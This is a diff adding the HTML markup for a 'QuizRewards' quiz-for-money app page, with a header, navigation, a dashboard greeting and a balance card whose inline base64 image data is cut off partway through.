@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QuizRewards - Premium Mobile App</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Cosmic Background with Stars -->
+    <div class="stars-container">
+        <div class="stars"></div>
+        <div class="twinkling"></div>
+    </div>
+
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <div class="header-left">
+                <img src="https://cdn.wiadomosci.onet.pl/1/oNik9lBaHR0cHM6Ly9vY2RuLmV1L3B1bHNjbXMvTURBXy9kMjk5NGQzMzE4MjJmOTY3ODU3ZTJhMDUzZDZmNzg3MC5qcGeSlQMAzQFFzQoozQW2kwXNCSTNBSTeAAKhMAehMQQ" alt="" class="logo">
+                <span class="app-name">QuizRewards</span>
+            </div>
+            <nav class="header-nav">
+                <a href="#" data-page="dashboard" class="nav-link active">Dashboard</a>
+                <a href="#" data-page="quiz" class="nav-link">Quiz</a>
+                <a href="#" data-page="withdraw" class="nav-link">Withdraw</a>
+            </nav>
+            <button id="signout-btn" class="signout-btn">Sign out</button>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <div class="app-container">
+        
+        <!-- Dashboard Page -->
+        <div id="dashboard-page" class="page active">
+            <div class="greeting">
+                <h1>Welcome, <span id="welcome-name">John</span>! 🎉</h1>
+                <p class="description">Answer science & finance quizzes to earn dollars!</p>
+                <p class="highlight">+$50 for Every Correct Answer!</p>
+            </div>
+
+            <!-- Balance Card -->
+            <div class="card balance-card">
+                <div class="card-content">
+                    <div class="balance-info">
+                        <p class="balance-label">Dollars Balance</p>
+                        <h2 class="balance-amount">$<span id="balance">0</span></h2>
+                    </div>
+                    <div class="balance-image">
+                        <img src="data:image/jpeg;base64,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